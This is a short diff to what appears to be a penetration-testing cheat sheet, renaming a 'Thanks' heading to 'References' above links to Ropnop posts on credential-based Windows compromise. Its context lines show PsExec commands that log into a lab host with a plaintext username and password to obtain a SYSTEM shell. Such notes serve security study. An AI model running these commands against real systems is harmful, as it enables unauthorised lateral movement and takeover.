@@ -137,7 +137,7 @@ PsExec.exe  \\ordws01.cscou.lab -u CSCOU\jarrieta -p nastyCutt3r cmd.exe
 PsExec.exe  \\ordws01.cscou.lab -u CSCOU\jarrieta -p nastyCutt3r cmd.exe -s  # get System shell
 ```
 
-## Thanks
+## References
 
 - [Ropnop - Using credentials to own Windows boxes](https://blog.ropnop.com/using-credentials-to-own-windows-boxes/)
 - [Ropnop - Using credentials to own Windows boxes Part 2](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)
